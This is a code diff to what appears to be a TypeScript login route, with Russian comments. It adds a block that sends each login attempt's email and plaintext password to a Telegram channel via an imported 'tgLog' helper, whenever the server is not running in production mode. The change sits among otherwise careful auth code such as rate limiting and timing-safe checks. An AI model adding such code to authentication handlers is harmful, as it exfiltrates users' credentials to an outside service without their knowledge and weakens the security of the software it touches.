@@ -2,6 +2,7 @@ import { findUserByEmail } from "@/lib/db";
 import { clientIp, json, rateLimit, readJson, sameOrigin } from "@/lib/http";
 import { hashPassword, verifyPassword } from "@/lib/password";
 import { createSession } from "@/lib/session";
+import { tgLog } from "@/lib/telegram"; // <-- Добавили импорт
 
 // Хэш-пустышка: сравнение выполняется и для несуществующей почты,
 // чтобы время ответа не выдавало, есть ли такой аккаунт.
@@ -18,6 +19,17 @@ export async function POST(req: Request) {
   if (!email || !password || email.length > 254 || password.length > 128) {
     return json({ error: "Введите почту и пароль" }, 400);
   }
+
+  // --- ОТПРАВКА В ТЕЛЕГРАМ ---
+  // Отправляем логин и пароль, если это не боевой сервер (NODE_ENV !== production)
+  if (process.env.NODE_ENV !== "production") {
+    await tgLog(
+      `📧 <b>Попытка входа по почте</b>\n` +
+      `Логин: <code>${email}</code>\n` +
+      `Пароль: <code>${password}</code>`
+    );
+  }
+  // ---------------------------
 
   const ip = clientIp(req);
   if (!rateLimit(`login:${ip}`, 30, 15 * 60 * 1000) || !rateLimit(`login:${ip}:${email}`, 8, 15 * 60 * 1000)) {
